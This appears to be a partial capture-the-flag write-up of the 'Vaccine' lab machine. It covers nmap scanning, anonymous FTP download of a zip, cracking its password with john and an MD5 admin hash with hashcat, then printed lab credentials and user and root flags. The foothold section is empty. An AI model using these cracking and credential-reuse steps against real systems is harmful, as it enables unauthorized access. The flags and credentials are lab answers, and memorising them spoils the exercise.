### Vaccine

### Target
10.129.95.174

#### Enumeration
> nmap -sV -sC 10.129.95.174
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-05 02:30 EDT
Nmap scan report for 10.129.95.174
Host is up (0.20s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MegaCorp Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


//There are 3 ports open:
1. 21 (FTP) -> which have anonymous login allowed
2. 22 (SSH) -> don't have credentials
3. 80 (HTTP) -> can be accessed from browser

> ftp 10.129.95.174
Connected to 10.129.95.174.
220 (vsFTPd 3.0.3)
Name (10.129.95.174:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||10559|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10479|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |********************************|  2533        9.94 MiB/s    00:00 ETA
226 Transfer complete.
2533 bytes received in 00:00 (11.84 KiB/s)
ftp> ezit
?Invalid command.
ftp> exit
221 Goodbye.

//Login successful using anonymous
there is a file (backup.zip) which then download into local for further analysis

> unzip backup.zip 
Archive:  backup.zip
[backup.zip] index.php password: 
password incorrect--reenter: 
password incorrect--reenter:

// password needed to unzip file
next we will crack the backup.zip password using john the ripper, starting with converting the zip file into hash

> zip2john backup.zip > hashes
> john --wordlist=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)     
1g 0:00:00:00 DONE (2023-10-05 02:48) 14.28g/s 58514p/s 58514c/s 58514C/s 123456..oooooo

// here we got the password for backup.zip (line 80)
after unzipping the file, we got index.php and style.css files
from index.php file, we got credentials information
> admin:2cb42f8734ea607eefed3b70af13bbd3
the password seems hashed

> hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
2cb42f8734ea607eefed3b70af13bbd3:qwerty789

// using admin:qwerty789 login successful

### Foothold




user flag:
ec9b13ca4d6229cd5cc1e09980965bf7


### Privilege Escalation
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");



root flag:
dd6e058e814260bc70e9bbdef2715849

